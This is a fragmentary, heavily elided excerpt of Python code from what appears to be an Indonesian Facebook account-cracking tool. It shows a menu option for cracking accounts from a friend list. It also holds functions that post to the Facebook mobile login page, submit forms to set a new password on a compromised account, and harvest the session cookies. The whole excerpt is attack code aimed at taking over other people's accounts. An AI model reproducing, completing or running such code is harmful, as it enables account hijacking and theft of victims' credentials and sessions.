...
def menu():
    ...
    print("\x1b[1;92m╠══[\x1b[1;93m11\x1b[1;92m] \x1b[1;97mInfo \x1b[1;97mCrack Dari Pertemanan Sendiri")
...
def cek_opsi(user,pw):
	...
	soup=parser(ses.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
...
def ubah_pw(user,pw,ses,response,link2):
	...
	for x in response("input"):
		if x.get("name") in but:
			data.update({x.get("name"):x.get("value")})
	ubahPw=ses.post(url+link2.get("action"),data=data).text
	...
	if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
		...
		an=ses.post(url+link3.get("action"),data=data2)
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
